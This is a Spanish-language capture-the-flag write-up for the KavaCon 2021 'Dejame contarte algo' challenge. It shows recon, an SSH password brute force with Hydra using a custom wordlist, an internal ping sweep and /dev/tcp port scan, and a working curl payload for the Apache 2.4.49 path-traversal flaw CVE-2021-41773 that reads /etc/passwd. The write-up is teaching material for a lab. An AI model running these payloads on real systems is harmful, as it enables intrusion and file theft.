---
classes: wide
title: "CTF-Kavacon - Writeup - Dejame contarte algo..."
date: 2021-10-26
header:
  teaser: /assets/images/content/CTF/Kavacon-2021/dejame/teaser.png
  teaser_home_page: true
categories:
  - CTF
  - Writeup
tags:
  - CTF
  - "2021"
  - Kavacon
---

Hace unos días se realizó el evento anual de "[KavaCon Cybersecurity Conference](https://kavacon.org)", y el DM estaba a cargo del CTF de este año. Me preguntó si podría colaborar con algún desafío para la ocasión, y pues acá estamos disponibles como humilde servidor que ha participado en estos lindos eventos jajaja. 

El año pasado tocó uno con temática de Lovecraft, y pues este 2021 no había que ser menos. Así que nos esmeramos en armar algo que desarrollara trabajar la capacidad de pensar fuera de la caja, y saber buscar los recursos necesarios, o tal vez trabajar con lo justo y necesario.

Ahora post-evento, me comentó que no pudieron resolver la máquina 💔 así que acá a modo de resolución, les comparto un manual de posible vía de resolución ("posible" porque estamos claros de que existen múltiples formas de llegar a un mismo punto).

## [+] Descripción del desafío

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled.png)

<aside>
📋 Y como no queremos ser tan malos, una pista, el desafío comienza en:
http://10.4.4.110:1337/ </aside>

---

Ingresamos primero a la URL que nos indica la descripción, y nos topamos con un sitio web que al parecer tiene temática de Lovecraft.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%201.png)

Indagamos un poco para conocer las tecnologías o frameworks que se están utilizando. Para ello utilizaremos "whatweb".

```bash
$ whatweb http://10.4.4.110:1337
http://10.4.4.110:1337 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.4.4.110], JQuery, Script, Title[CTF Kavacon_2021], probably WordPress
```

Nada relevante a simple vista. Solo sabemos que el servicio web corresponde a un "Apache", pero desconocemos la versión.

Revisemos si hay algo interesante en el código fuente del sitio.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%202.png)

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%203.png)

Vaya comentario. Al menos se nos indica que no nos servirá revisar por esa vía 🤷‍♂️.

Siguiendo con la fase de reconocimiento, veamos si podemos encontrar algún directorio o archivo interesante. Para esta revisión existe un sin fin de herramientas tales como wfuzz, ffuzz, gobuster, etc. En esta oportunidad haremos uso de "[Dirsearch](https://github.com/maurosoria/dirsearch)".

Generalmente cuando son servicios tipo Apache, Nginx por ejemplo, agrego "php" en las extensiones a revisar, ya que se pueden obtener resultados interesantes.

```
$ dirsearch -u http://10.4.4.110:1337 -e php,hmtl,txt -w /usr/share/wordlists/dirb/big.txt -t 50 --plain-text-report=dirsearch_first.txt

 _|. _ _  _  _  _ _|_   
(_||| _) (/_(_|| (_| )

Extensions: php, hmtl, txt | HTTP method: get | Threads: 50 | Wordlist size: 20469

Target: http://10.4.4.110:1337

[13:57:09] Starting: 
[13:57:14] 301 -  238B  - /assets  ->  http://10.4.4.110:1337/assets/
[13:57:26] 301 -  238B  - /images  ->  http://10.4.4.110:1337/images/
[13:57:38] 200 -    4KB - /robots.txt         
                                                
Task Completed
```

Solo 3 resultados. 2 carpetas de recursos generales de un sitio web genérico, y aparte el típico archivo robots.txt

Revisemos qué trae este último.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%204.png)

Nada importante. Try hard al menos.

Casi se nos olvida un punto importante en la revisión. Usar nmap para ver si encontramos más información que nos pueda servir.

Primero escaneamos todos los puertos para detectar cuales están alojando un servicio en la máquina, y luego hacemos el filtro para aplicar los scripts.

```
nmap -p- 10.4.4.110 -n -v --open -oG nmap_first
.
.
.
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
2222/tcp open  EtherNetIP-1
9911/tcp open  sype-transport
9982/tcp open  unknown
9998/tcp open  distinct32
.
.
.
```

Disclaimer: los puertos 9911,9982, y 9998 corresponden a otros desafíos. Solo que por estar alojados en el mismo servidor, estos fueron detectados por nmap, así como también el puerto 22 que corresponde a la administración del server. Como somos niños buenos, no tocaremos esa parte todo por el bien del juego limpio.

Ahora, nos enfocaremos solo en los puertos "1337"  (que ya sabemos que corresponde al servicio Apache), y al 2222.

```
nmap -p1337,2222 -sCV --reason 10.4.4.110 -v -oN nmap_second
.
.
PORT     STATE SERVICE     REASON  VERSION
1337/tcp open  http        syn-ack Apache httpd
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache
|_http-title: CTF Kavacon_2021
2222/tcp open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ae:46:87:e8:0b:56:1f:c9:c3:3f:b6:6c:e7:2f:0b:e9 (RSA)
|   256 00:99:01:af:a5:23:6b:b8:b4:7c:67:a3:6a:62:c6:a6 (ECDSA)
|_  256 36:07:bb:83:b9:9e:d8:41:b8:db:a1:5b:65:07:b3:17 (ED25519)
.
.
```

Vaya vaya. Un puerto SSH. Lo dejaremos en background mientras revisamos con mayor determinación el sitio web.

Al leer un poco más calmado el contenido, nos habla un poco sobre el origen del "Necronomicón" (Libro escrito por H.P. Lovecraft), su cronología, y también sobre los "50 Nombres de Marduk". Adicional, se puede apreciar una galería de imágenes con símbolos que aparentan ser la representación de los nombres de Marduk.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%205.png)

Al final del sitio, nos llama algo la atención, y es el "by **Howard**". Habitualmente en los sitios tipo blogs, foros, o páginas random que hablan sobre un tema, se suele indicar quien es el autor del contenido. Lo tendremos en consideración.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%206.png)

Si miramos los símbolos y hacemos click sobre ellos, mediante herramientas de desarrollador veremos la ruta donde están siendo alojadas. Esta concuerda además con los resultados anteriormente obtenidos con Dirsearch.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%207.png)

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%208.png)

Pequeño detalle: en la carpeta de las imágenes se encuentran más de las que se muestran en la galería. Será una pista?

Con el navegador que estoy utilizando (Vivaldi), al hacer click secundario sobre una imagen cualquiera, me permite hacer una búsqueda de ella en Google.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%209.png)

Para otros casos, es posible descargar la imagen y hacer una búsqueda por Google Imágenes. Al hacerlo, dentro de los resultados que coinciden con la búsqueda, llegamos a una página que justamente habla sobre los 50 nombre de Marduk.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2010.png)

- [Los Cincuenta Nombres de Marduk](https://simbologiadelmundo.com/los-cincuenta-nombres-de-marduk/)

Al dar un vistazo rápido, vemos que aparecen los mismos símbolos del desafío, y además aparecen los nombres de cada uno.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2011.png)

En este punto, tal vez podríamos pensar en hacer un diccionario con los 50 nombres, ya que se mencionan demasiados. Podríamos ir copiando uno por uno (ya que son 50), o podríamos aprovechar la terminal para poder hacerlo con una sola línea.

```bash
curl -s -k -L "https://simbologiadelmundo.com/los-cincuenta-nombres-de-marduk/" | grep "h2"| grep "style" | cut -d'.' -f2 | tr '\<\/h2\>' ' ' | awk 'NF>1{print $NF}' >> 50_nombres.txt
```

Si analizamos todo lo que llevamos hasta el momento:

- 2 servicios. Uno HTTP y uno SSH.
- Diccionario de 50 nombres medios raros de pronunciar.
- Un eventual usuario "Howard".

Cabe pensar, ¿podríamos realizar fuerza bruta al servicio SSH con lo que tenemos ahora?. La respuesta es si. 

Nuestra herramienta para este punto será "Hydra". Herramienta por excelencia entre muchas para este tipo de pruebas.

Como al primer intento de "Howard" no fue exitoso, probamos nuevamente pero con todo el usuario en minúsculas. Es muy común que se presenten situaciones donde el usuario sea todo con mayúsculas, todo con minúsculas, o con la primera letra en mayúscula y el resto en minúscula. Esas opciones al considerarlas para múltiples usuarios, podría llegar a obligarnos a crear un diccionario con usuarios para poder optimizar tiempo. En esta oportunidad, como es uno solo, podríamos indicarlo directamente en la sintaxis de la herramienta.

```bash
hydra -l howard -P 50_nombres.txt ssh://10.4.4.110:2222
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-20 19:40:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://10.4.4.110:2222/
[2222][ssh] host: 10.4.4.110   login: howard   password: LUGALABDUBUR
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-20 19:40:31
```

HABEMUS CREDENCIALES VÁLIDAS!!

- Usuario: howard
- Contraseña: LUGALABDUBUR

Las probamos de inmediato tratando de conectarnos por el servicio y ...

```bash
ssh howard@10.4.4.110 -p 2222
howard@10.4.4.110's password: 
Linux necronomicon 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
howard@necronomicon:~$
```

ESTAMOS DENTRO DE LA MÁQUINA!! \o/

Disclaimer2: la felicidad solo dura un momento porque la flag no se encuentra acá.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2012.png)

Al ver los archivos ubicados en el directorio home del usuario "howard", encontramos uno que dice "notas.txt". 

```bash
howard@necronomicon:~$ cat notas.txt 
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
[+] Notas
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 [-] Levantar frontend: listo
 [-] Ocultar banners de versiones: listo
 [-] Publicar al ambiente prod: listo
 [-] Aislar el ambiente test a internet: listo
```

Las últimas 2 líneas nos hace ruido. Lo tendremos en consideración. 

Mientras tanto, comenzaremos a realizar un reconocimiento de la máquina. Para esta oportunidad utilizaremos el recurso de "[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)".  Para ello, realizaremos una trasferencia de archivo desde nuestro equipo a la máquina.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2013.png)

La otra forma que suelo utilizar para realizar reconocimiento de forma manual de la máquina, es mediante la guía de "g0tmi1k". En su momento me la recomendaron y ahora la tengo como sagrada biblia.😌

- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Una vez que nos damos cuenta que no tenemos mucho qué hacer dentro de la máquina, consideramos hacer un poco de reconocimiento de la red. Más que nada, uno de los puntos que decía el "notas.txt" era "Aislar el ambiente test a internet". Eso nos da a entender que hay más de una instancia.

Primero vemos qué IP tenemos junto con la máscara de red.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2014.png)

Vemos que el entorno tiene la 172.16.0.2, y que su máscara de red es 255.255.255.0 ( o sub-máscara /24). Esto quiere decir que podrían haber 255 hosts dentro del segmento. Así que no sería descabellado de igual manera pensar en hacer un reconocimiento por esta vía. 

Podríamos optar por transferir un binario estático de nmap tal vez y ejecutar un escaneo -sn para detectar todos los hosts vivos dentro de la red.

- [static-binaries/nmap at master · andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2015.png)

O bien, como forma alternativa podríamos construir con un par de líneas un script en bash.

```bash
#!/bin/bash

for i in $(seq 1 255);do
        ping -c2 -i0.25 -s24 -W1 -n -q 172.16.0.$i > /dev/null
        if [ $? -eq 0 ];then
                echo -e "172.16.0.$i - OK"
        fi
done
```

```bash
$ ./netscan.sh
172.16.0.1 - OK
172.16.0.2 - OK
172.16.0.3 - OK
```

Tenemos 3 detecciones. La "172.16.0.1" sabemos que corresponde al gateway o puerta de enlace; la "172.16.0.2" corresponde a la dirección de la actual máquina, por ende, la "172.16.0.3" sería una potencial vía a considerar.

Bajo la misma premisa de construir algo simple para el reconocimiento, con 3 líneas de código podemos construir un escáner de puertos.

```bash
#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo > /dev/tcp/172.16.0.3/$port" 2>/dev/null && echo "Port $port - OPEN" &
done; wait
```

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2016.png)

Vemos que solamente tiene abierto el puerto 80. Será servicio web? Probamos con un simple curl para verificar.

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2017.png)

Y efectivamente corresponde a un servicio web, y para nuestra sorpresa, es el ambiente test que se menciona en las notas que pillamos en un principio. Podríamos tal vez ver mayor info según los headers que tenga. 

```bash
$ curl -s -I 172.16.0.3
HTTP/1.1 200 OK
Date: Wed, 20 Oct 2021 23:35:00 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Tue, 19 Oct 2021 00:04:26 GMT
ETag: "1aab-5ce63bb2e2140"
Accept-Ranges: bytes
Content-Length: 6827
Content-Type: text/html
```

Si ponemos atención, nos muestra que el servicio web corresponde a un Apache 2.4.49. Esta versión es susceptible a una vulnerabilidad de tipo path traversal, y que posteriormente se pudo obtener ejecución remota de comandos bajo la misma vía. 

- [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)
- [CVE-2021-41773  -  AttackerKB](https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis?referrer=blog)

- [Apache HTTP Server CVE-2021-41773 Exploited in the Wild  -  Rapid7 Blog](https://www.rapid7.com/blog/post/2021/10/06/apache-http-server-cve-2021-41773-exploited-in-the-wild/)

Con el caso de nosotros, no será necesario explotar el RCE, a menos que previamente hagamos transferencia de archivos nuevamente, para que podamos tener la reversa, o bien realizar port forwarding a nuestra máquina local.

Probamos agrega el payload al curl que estábamos probando en un principio y...

```bash
curl "172.16.0.3/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

howard@necronomicon:~$ curl "172.16.0.3/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
howard:x:1000:1000::/home/howard:/bin/bash
```

Vemos que el servicio Apache es vulnerable al CVE, y para nuestra sorpresa, el usuario "howard" está dentro de la máquina vulnerable con su correspondiente directorio "/home". Probaríamos revisar si se encuentra la flag en su ruta y...

```bash
curl "172.16.0.3/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/howard/flag.txt"

howard@necronomicon:~$ curl "172.16.0.3/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/howard/flag.txt"
flag{Bu3n_tr4b4j0_huM4nO}
```

![Untitled](/assets/images/content/CTF/Kavacon-2021/dejame/Untitled%2018.png)

Habemus flag!🏁🏆

---

Espero les haya gustado, y más allá de haber logrado o no obtener la flag, haya servido para aprender alguno que otro tip 😄.
